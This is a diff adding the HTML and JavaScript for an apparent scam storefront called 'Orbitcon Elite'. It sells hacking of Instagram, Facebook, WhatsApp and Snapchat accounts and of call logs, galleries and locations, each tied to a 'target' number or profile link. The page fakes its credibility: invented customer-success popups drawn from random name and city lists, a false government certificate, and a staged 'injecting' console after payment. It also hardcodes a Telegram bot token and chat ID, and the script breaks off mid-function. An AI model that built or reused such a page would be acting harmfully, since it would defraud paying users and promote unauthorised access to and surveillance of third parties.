@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="facebook-domain-verification" content="VERIFICATION_CODE_HERE" />
+    <title>Orbitcon Elite - Secure Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root { --neon-blue: #00f2ff; --neon-green: #0f0; --deep-dark: #02050a; --card-bg: rgba(5, 12, 20, 0.95); --border: rgba(0, 242, 255, 0.3); }
+        body { background-color: var(--deep-dark); color: #e0e0e0; font-family: 'Inter', sans-serif; margin: 0; overflow-x: hidden; }
+        #canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.6; pointer-events: none; }
+        header { padding: 60px 20px 20px; text-align: center; }
+        .logo-text { font-family: 'Orbitron', sans-serif; color: var(--neon-blue); font-size: clamp(1.8rem, 6vw, 3rem); letter-spacing: 5px; text-shadow: 0 0 20px rgba(0, 242, 255, 0.6); margin: 0; text-transform: uppercase; font-weight: 700; }
+        .work-notice { color: #0f0; font-family: 'Orbitron'; font-size: 0.85rem; margin-top: 15px; letter-spacing: 1.5px; }
+        .container { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; padding: 40px 15px; max-width: 1200px; margin: 0 auto; }
+        .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 2px; padding: 30px 20px; width: 320px; text-align: center; transition: 0.4s; position: relative; overflow: hidden; }
+        .card:hover { transform: translateY(-10px); border-color: var(--neon-blue); box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
+        .color-title { font-family: 'Orbitron', sans-serif; font-weight: 700; background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: moveGradient 3s linear infinite; margin-bottom: 20px; font-size: 1.4rem; }
+        .social-title { background-image: linear-gradient(to right, #ff00ea, #00f2ff, #00ff40, #ff00ea); }
+        .device-title { background-image: linear-gradient(to right, #ff8800, #ffea00, #ff3300, #ff8800); }
+        .system-title { background-image: linear-gradient(to right, #9d00ff, #0044ff, #00f2ff, #9d00ff); }
+        @keyframes moveGradient { to { background-position: 200% center; } }
+        .price-tag { font-family: 'Orbitron'; font-size: 2.5rem; color: var(--neon-blue); margin: 15px 0; }
+        .feature-list { text-align: left; padding: 0; list-style: none; margin: 20px 0; font-size: 0.85rem; color: #ccc; }
+        .feature-list li { margin-bottom: 8px; display: flex; align-items: center; }
+        .feature-list li i { color: var(--neon-blue); margin-right: 10px; font-size: 0.9rem; }
+        .order-btn { background: transparent; color: var(--neon-blue); border: 1px solid var(--neon-blue); padding: 12px; width: 100%; font-family: 'Orbitron'; cursor: pointer; font-weight: bold; text-transform: uppercase; transition: 0.3s; }
+        .order-btn:hover:not(:disabled) { background: var(--neon-blue); color: #000; }
+        .about-section { max-width: 1100px; margin: 50px auto 80px; padding: 20px; }
+        .badge-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .unique-badge { background: rgba(0, 242, 255, 0.05); border: 1px solid var(--border); padding: 25px; border-radius: 10px; display: flex; align-items: center; gap: 20px; transition: 0.3s; }
+        .unique-badge:hover { background: rgba(0, 242, 255, 0.1); border-color: var(--neon-blue); }
+        .unique-badge i { font-size: 2.2rem; min-width: 50px; text-align: center; }
+        .unique-badge h4 { font-family: 'Orbitron'; font-size: 0.85rem; color: #fff; margin: 0; letter-spacing: 1px; }
+        .unique-badge p { font-size: 0.7rem; color: #888; margin-top: 5px; }
+        .refund-card { background: linear-gradient(135deg, rgba(255, 0, 0, 0.1), rgba(0, 0, 0, 0.8)); border: 1px solid #ff4444; padding: 30px; border-radius: 10px; text-align: center; margin-top: 20px; }
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.98); z-index: 5000; justify-content: center; align-items: center; backdrop-filter: blur(10px); }
+        .custom-modal { background: #050c14; border: 1px solid var(--neon-blue); padding: 40px 30px; width: 90%; max-width: 450px; text-align: center; border-radius: 4px; box-shadow: 0 0 40px rgba(0, 242, 255, 0.1); }
+        .option-btn { display: flex; align-items: center; justify-content: space-between; padding: 18px 25px; margin: 15px 0; border: 1px solid var(--border); color: #fff; background: rgba(255, 255, 255, 0.03); cursor: pointer; font-family: 'Orbitron'; font-size: 0.9rem; transition: 0.3s; }
+        .cyber-input { width: 100%; padding: 15px; background: rgba(0, 0, 0, 0.6); border: 1px solid var(--border); color: #fff; box-sizing: border-box; margin-bottom: 20px; font-family: 'Inter'; font-size: 1rem; outline: none; }
+        .qr-img { width: 240px; height: 240px; border: 2px solid #fff; margin: 10px 0; padding: 5px; background: #fff; }
+        .loader { border: 4px solid rgba(0, 242, 255, 0.1); border-top: 4px solid var(--neon-blue); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 30px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .back-link { display: block; color: #ff4444; font-family: 'Orbitron'; font-size: 0.75rem; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
+        .progress-fill { width: 0%; height: 6px; background: var(--neon-green); transition: width 0.2s; box-shadow: 0 0 10px var(--neon-green); }
+        .hacker-window { background: #000; border: 1px solid var(--neon-green); width: 95%; max-width: 800px; height: 85vh; padding: 10px; font-family: 'Fira Code', monospace; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 0 40px rgba(0, 255, 0, 0.2); }
+        .console-header { border-bottom: 1px solid var(--neon-green); padding: 5px 10px; color: var(--neon-green); font-size: 0.8rem; display: flex; justify-content: space-between; }
+        .console-main { flex: 1; display: flex; flex-direction: column; overflow-y: auto; padding: 10px; }
+        .terminal-log { color: var(--neon-green); font-size: 0.75rem; line-height: 1.4; margin-bottom: 15px; text-align: left; }
+        .trust-popup { position: fixed; bottom: 20px; left: -350px; width: 300px; background: rgba(5, 12, 20, 0.95); border: 1px solid var(--neon-blue); color: #fff; padding: 15px; display: flex; align-items: center; gap: 12px; border-radius: 4px; z-index: 9999; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .trust-popup.active { left: 20px; }
+        
+        /* Merged Legal Footer Style */
+        .meta-footer { background: #010306; padding: 40px 20px; border-top: 1px solid var(--border); text-align: center; font-size: 0.8rem; color: #666; margin-top: 40px; }
+        .meta-footer b { color: var(--neon-blue); }
+    </style>
+
+    <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/698414decf439d1c3bd9ed1f/default';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+</head>
+<body onclick="activateVoice()">
+
+<canvas id="canvas"></canvas>
+
+<div id="trustPopup" class="trust-popup">
+    <i class="fas fa-check-circle" style="color:var(--neon-green); font-size:1.5rem;"></i>
+    <div style="font-size: 0.8rem; line-height: 1.2;" id="trustMsg"></div>
+</div>
+
+<header>
+    <h1 class="logo-text">Orbitcon Elite</h1>
+    <p class="work-notice">Official Recovery & Security Portal | Estimated Time: 15 Mins.</p>
+</header>
+
+<div class="container">
+    <div class="card">
+        <h3 class="color-title social-title">SOCIAL RECOVERY</h3>
+        <ul class="feature-list">
+            <li><i class="fab fa-instagram"></i> Instagram Recovery</li>
+            <li><i class="fab fa-facebook"></i> Facebook Recovery</li>
+            <li><i class="fab fa-whatsapp"></i> WhatsApp Data Restoration</li>
+            <li><i class="fab fa-snapchat"></i> Snapchat Support</li>
+        </ul>
+        <div class="price-tag">₹599</div>
+        <button class="order-btn" onclick="openStep('selectionModal')">BOOK NOW</button>
+    </div>
+
+    <div class="card">
+        <h3 class="color-title device-title">DATA DIAGNOSTICS</h3>
+        <ul class="feature-list">
+            <li><i class="fas fa-microphone"></i> Call Log Analysis</li>
+            <li><i class="fas fa-history"></i> History Retrieval</li>
+            <li><i class="fas fa-images"></i> Media Gallery Scan</li>
+            <li><i class="fas fa-map-marker-alt"></i> Location Safety Audit</li>
+        </ul>
+        <div class="price-tag">₹699</div>
+        <button class="order-btn" onclick="openStep('deviceSelectionModal')">BOOK NOW</button>
+    </div>
+
+    <div class="card">
+        <h3 class="color-title system-title">SYSTEM SECURITY</h3>
+        <ul class="feature-list">
+            <li><i class="fas fa-user-secret"></i> Full Security Audit</li>
+            <li><i class="fas fa-shield-alt"></i> Root Level Diagnostics</li>
+            <li><i class="fas fa-desktop"></i> Remote Access Security</li>
+        </ul>
+        <div class="price-tag">₹999</div>
+        <button class="order-btn" onclick="prepareInput('Advanced Security Audit', 999, 'number')">BOOK NOW</button>
+    </div>
+</div>
+
+<div class="about-section">
+    <h2 style="font-family: 'Orbitron'; color: var(--neon-blue); text-align: center; margin-bottom: 40px; letter-spacing: 5px; text-shadow: 0 0 15px rgba(0, 242, 255, 0.4);">TRUSTED SECURITY PROTOCOLS</h2>
+    <div class="badge-grid">
+        <div class="unique-badge"><i class="fas fa-file-contract" style="color: #FFD700;"></i><div><h4>GOVERNMENT CERTIFICATE</h4><p>Authorized by Online service</p></div></div>
+        <div class="unique-badge"><i class="fas fa-microchip" style="color: var(--neon-blue);"></i><div><h4>99% ACCURACY WORK</h4><p>High Precision Diagnostics</p></div></div>
+        <div class="unique-badge"><i class="fas fa-user-lock" style="color: #0f0;"></i><div><h4>100% SAFE & SECURE</h4><p>End-to-End Encrypted Protocols</p></div></div>
+        <div class="unique-badge"><i class="fas fa-shield-check" style="color: var(--neon-blue);"></i><div><h4>SECURE PAYMENT</h4><p>Protected Transaction Gateway</p></div></div>
+        <div class="unique-badge"><i class="fas fa-users-check" style="color: #0f0;"></i><div><h4>12,000+ CUSTOMERS</h4><p>Satisfied & Trusted Worldwide</p></div></div>
+        <div class="unique-badge"><i class="fas fa-headset" style="color: var(--neon-blue);"></i><div><h4>24*7 LIVE SUPPORT</h4><p>Active Support Chat Assistance</p></div></div>
+    </div>
+    <div class="refund-card">
+        <i class="fas fa-hand-holding-usd" style="font-size: 3rem; color: #ff4444; margin-bottom: 15px;"></i>
+        <h3 style="font-family: 'Orbitron'; color: #fff; font-size: 1.3rem; margin-bottom: 10px;">100% MONEY BACK GUARANTEE</h3>
+        <p style="color: #ccc; font-size: 0.9rem; line-height: 1.6; max-width: 800px; margin: 0 auto;">Agar aapka work complete nahin hota hai to aapka payment <b>100% refund</b> kar diya jaega. Delivery <b>WhatsApp</b> par bhej di jayegi.</p>
+    </div>
+</div>
+
+<footer class="meta-footer">
+    <p>© 2026 Orbitcon Elite Cyber Services. All Rights Reserved.</p>
+    <p>Owned & Managed by: <b>Online service</b></p>
+    <p>Udyam Registration: <b>UDYAM-I-RJ-32-9034857</b></p>
+    <p>Location: <b>Dooni, Tonk, Rajasthan - 304802</b></p>
+    
+    <div style="margin-top: 10px;">
+        <a href="privacy.html" style="color: #666; text-decoration: none; font-size: 0.7rem; border-bottom: 1px solid #333;">Privacy Policy</a>
+    </div>
+
+    <p style="font-size: 0.65rem; color: #444; margin-top: 15px;">Disclaimer: We specialize in data recovery and authorized security diagnostics. Any misuse is strictly prohibited.</p>
+</footer>
+
+<div id="selectionModal" class="modal-overlay">
+    <div class="custom-modal">
+        <h2 style="font-family:'Orbitron'; color:var(--neon-blue);">SELECT RECOVERY APP</h2>
+        <div class="option-btn" onclick="prepareInput('Instagram', 599, 'link')">INSTAGRAM <i class="fab fa-instagram"></i></div>
+        <div class="option-btn" onclick="prepareInput('Facebook', 599, 'link')">FACEBOOK <i class="fab fa-facebook"></i></div>
+        <div class="option-btn" onclick="prepareInput('WhatsApp', 599, 'number')">WHATSAPP <i class="fab fa-whatsapp"></i></div>
+        <div class="option-btn" onclick="prepareInput('Snapchat', 599, 'link')">SNAPCHAT <i class="fab fa-snapchat"></i></div>
+        <span class="back-link" onclick="closeModals()">← Back</span>
+    </div>
+</div>
+
+<div id="deviceSelectionModal" class="modal-overlay">
+    <div class="custom-modal">
+        <h2 style="font-family:'Orbitron'; color:var(--neon-blue);">SELECT SERVICE</h2>
+        <div class="option-btn" onclick="prepareInput('Call Analysis', 699, 'number')">CALL ANALYSIS <i class="fas fa-microphone"></i></div>
+        <div class="option-btn" onclick="prepareInput('History Retrieval', 699, 'number')">HISTORY RETRIEVAL <i class="fas fa-history"></i></div>
+        <div class="option-btn" onclick="prepareInput('Gallery Recovery', 699, 'number')">GALLERY RECOVERY <i class="fas fa-images"></i></div>
+        <div class="option-btn" onclick="prepareInput('Location Audit', 699, 'number')">LOCATION AUDIT <i class="fas fa-map-marker-alt"></i></div>
+        <span class="back-link" onclick="closeModals()">← Back</span>
+    </div>
+</div>
+
+<div id="targetModal" class="modal-overlay">
+    <div class="custom-modal">
+        <h2 id="targetTitle" style="font-family:'Orbitron'; color:var(--neon-blue);">DETAILS</h2>
+        <p id="targetDynamicLabel" style="font-size: 0.85rem; color:#888; font-family:'Orbitron';"></p>
+        <input type="text" id="targetData" class="cyber-input" placeholder="Type here...">
+        <button class="order-btn" onclick="showPayment()">CONTINUE TO PAYMENT</button>
+        <span class="back-link" onclick="closeModals()">← Go Back</span>
+    </div>
+</div>
+
+<div id="paymentModal" class="modal-overlay">
+    <div class="custom-modal">
+        <h2 style="font-family:'Orbitron'; color:var(--neon-blue);">SECURE PAYMENT</h2>
+        <div id="payAmt" class="price-tag"></div>
+        <button onclick="payViaApp()" style="border:none; width:100%; display: block; background: var(--neon-blue); color: #000; padding: 15px; border-radius: 4px; font-family: 'Orbitron'; font-weight: bold; margin-bottom: 15px; box-shadow: 0 0 15px var(--neon-blue); cursor:pointer;"><i class="fas fa-bolt"></i> PAY VIA UPI APP</button>
+        <img src="" id="qrImage" class="qr-img" alt="QR Code">
+        <div style="margin: 15px 0; text-align: left;">
+            <label style="color: var(--neon-blue); font-family: 'Orbitron'; font-size: 0.7rem; display: block; margin-bottom: 8px; text-transform: uppercase;"><i class="fas fa-upload"></i> Upload Payment Screenshot</label>
+            <input type="file" id="payScreenshot" accept="image/*" onchange="checkUpload()" style="width: 100%; color: #fff; font-size: 0.8rem; background: rgba(255,255,255,0.05); border: 1px dashed var(--border); padding: 10px; cursor: pointer;">
+        </div>
+        <button id="payBtn" class="order-btn" onclick="startVerification()" disabled style="opacity: 0.4; cursor: not-allowed;">I HAVE PAID SUCCESSFULLY</button>
+    </div>
+</div>
+
+<div id="verifyModal" class="modal-overlay">
+    <div class="custom-modal"><div class="loader"></div><h2 style="font-family:'Orbitron'; color:var(--neon-blue);">VERIFYING PAYMENT</h2></div>
+</div>
+
+<div id="deliveryModal" class="modal-overlay">
+    <div class="custom-modal">
+        <h2 style="font-family:'Orbitron'; color:#0f0;">PAYMENT VERIFIED</h2>
+        <p style="color:#888; margin-bottom: 20px;">Enter your WhatsApp number to receive access link.</p>
+        <input type="text" id="userWhatsApp" class="cyber-input" placeholder="+91 WhatsApp Number">
+        <button class="order-btn" onclick="runHackerConsole()">GET ACCESS NOW</button>
+    </div>
+</div>
+
+<div id="successConsole" class="modal-overlay">
+    <div class="hacker-window">
+        <div class="console-header"><span>CONSOLE: ROOT@ORBITCON</span><span>[STATUS: INJECTING]</span></div>
+        <div class="console-main">
+            <div id="terminalLog" class="terminal-log">> Initializing recovery system...<br></div>
+            <div style="background:#111; height:6px; margin:10px 0;"><div id="consoleProgress" class="progress-fill"></div></div>
+            <p id="consoleStatus" style="color:var(--neon-green); font-size:0.7rem;">PROCESSING DATA: 0%</p>
+        </div>
+    </div>
+</div>
+
+<script>
+let price = 0; let service = "";
+const TELEGRAM_TOKEN = '8583696255:AAHLV5QCaSZwI0R0uhNl2i1zG69s13eSJXI';
+const CHAT_ID = '7857452248';
+const MY_UPI = 'BHARATPE.8C0K1N0E4X19304@fbpe';
+
+// Matrix Animation
+const canvas = document.getElementById('canvas'); const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+const letters = "01"; const fontSize = 15; const columns = canvas.width / fontSize; const drops = [];
+for (let i = 0; i < columns; i++) drops[i] = 1;
+function drawMatrix() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#00f2ff"; ctx.font = fontSize + "px Fira Code";
+    for (let i = 0; i < drops.length; i++) {
+        const text = letters.charAt(Math.floor(Math.random() * letters.length));
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+    }
+}
+setInterval(drawMatrix, 50);
+
+// Voice Logic
+const AI = { spoken: false, speak: function(txt) { window.speechSynthesis.cancel(); let m = new SpeechSynthesisUtterance(txt); window.speechSynthesis.speak(m); } };
+function activateVoice() { if(!AI.spoken) { AI.speak("Welcome to Orbitcon Elite Secure Portal."); AI.spoken = true; } }
+
+// Notification Logic
+const names = ["Rahul", "Amit", "Priya", "Vikram", "Sneha", "Karan", "Anjali", "Deepak", "Pooja", "Arjun"];
+const cities = ["Kolkata", "Delhi", "Mumbai", "Bangalore", "Chennai", "Hyderabad", "Pune", "Ahmedabad", "Lucknow", "Jaipur"];
+function showTrustPopup() {
+    const name = names[Math.floor(Math.random() * names.length)];
+    const city = cities[Math.floor(Math.random() * cities.length)];
+    document.getElementById('trustMsg').innerHTML = `<b>${name}</b> from <b>${city}</b> successfully completed recovery.`;
+    document.getElementById('trustPopup').classList.add('active');
+    setTimeout(() => document.getElementById('trustPopup').classList.remove('active'), 3000);
+}
+setInterval(showTrustPopup, 5000);
+
+// App Logic
+function openStep(id) { closeModals(); document.getElementById(id).style.display = 'flex'; }
+function closeModals() { document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none'); }
+function prepareInput(s, p, type) { 
+    service = s; price = p; 
+    document.getElementById('targetTitle').innerText = s; 
+    document.getElementById('targetDynamicLabel').innerText = (type === 'number') ? "Enter Target Phone Number" : "Enter Target Profile Link";
+    openStep('targetModal'); 
+}
+
+function showPayment() { 
+    if(!document.getElementById('targetData').value) return alert("Please enter details!");
+    do
